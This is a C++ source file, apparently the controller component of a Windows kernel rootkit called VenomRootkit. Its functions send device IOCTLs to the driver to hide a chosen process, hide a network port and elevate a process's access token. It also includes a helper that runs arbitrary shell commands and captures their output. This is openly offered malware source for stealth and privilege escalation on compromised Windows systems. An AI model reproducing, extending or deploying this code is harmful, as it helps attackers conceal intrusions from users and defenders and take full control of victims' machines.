#include "VenomCommands.h"
#include "../VenomRootkit/Ioctl.h"
#include <array>


bool VenomCommands::hideProcess(ULONG pid)
{
	auto hDevice = CreateFile(VenomSymLink, GENERIC_WRITE,
		FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

	DWORD returned = 0;
	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::HideProcces, &pid, sizeof(pid), nullptr, 0, &returned, nullptr);

	CloseHandle(hDevice);

	return success;
}

bool VenomCommands::hidePort(USHORT port)
{
	auto hDevice = CreateFile(VenomSymLink, GENERIC_WRITE,
		FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

	DWORD returned = 0;
	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::HidePort, &port, sizeof(port), nullptr, 0, &returned, nullptr);

	CloseHandle(hDevice);

	return success;
}

bool VenomCommands::elevateToken(ULONG pid)
{
	auto hDevice = CreateFile(VenomSymLink, GENERIC_WRITE,
		FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

	DWORD returned = 0;
	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::Elevate, &pid, sizeof(pid), nullptr, 0, &returned, nullptr);

	CloseHandle(hDevice);

	return success;
}

// TODO: Add support for non fixed command output size.
bool VenomCommands::executeCommand(const char* command, const char* output)
{
	std::array<char, VenomCommands::commandOutputBufferLength> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command, "r"), _pclose);

	if (!pipe)
		//Add a log: Error while opening pipe.
		return 1;

	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
	{
		result += buffer.data();
	}

	memcpy_s((void*)output, VenomCommands::commandOutputBufferLength, result.c_str(), VenomCommands::commandOutputBufferLength);

	return 0;
}